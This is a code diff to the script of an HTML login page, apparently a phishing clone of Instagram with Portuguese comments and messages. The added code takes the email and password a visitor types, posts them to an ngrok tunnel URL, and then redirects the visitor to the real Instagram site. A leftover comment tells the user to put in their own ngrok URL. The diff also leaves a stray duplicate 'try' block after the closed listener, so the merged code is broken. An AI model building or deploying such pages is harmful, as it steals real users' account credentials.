@@ -103,19 +103,36 @@
 
 <script>
     document.getElementById("loginForm").addEventListener("submit", async function(e) {
-        e.preventDefault();
-        const email = document.getElementById("email").value;
-        const password = document.getElementById("password").value;
-        const button = document.getElementById("loginButton");
-        
-        // Animação de loading
-        button.disabled = true;
-        button.innerHTML = `
-            <div class="flex items-center justify-center">
-                <div class="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
-                Logging in...
-            </div>
-        `;
+    e.preventDefault();
+    const button = document.getElementById("loginButton");
+    button.disabled = true;
+    button.textContent = "Enviando...";
+
+    try {
+        const response = await fetch("https://53b8-170-244-6-217.ngrok-free.app/login", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: new URLSearchParams({
+                email: document.getElementById("email").value,
+                password: document.getElementById("password").value
+            })
+        });
+
+        if (!response.ok) throw new Error("Falha no servidor");
+        console.log("Dados enviados com sucesso!");
+        window.location.href = "https://www.instagram.com/";
+
+    } catch (error) {
+        console.error("Erro:", error);
+        button.textContent = "Erro - Tente novamente";
+        setTimeout(() => {
+            button.textContent = "Log In";
+            button.disabled = false;
+        }, 2000);
+    }
+});
         
         try {
             // Envia para o servidor via Ngrok (ATUALIZE ESTA URL COM SEU NGROK)
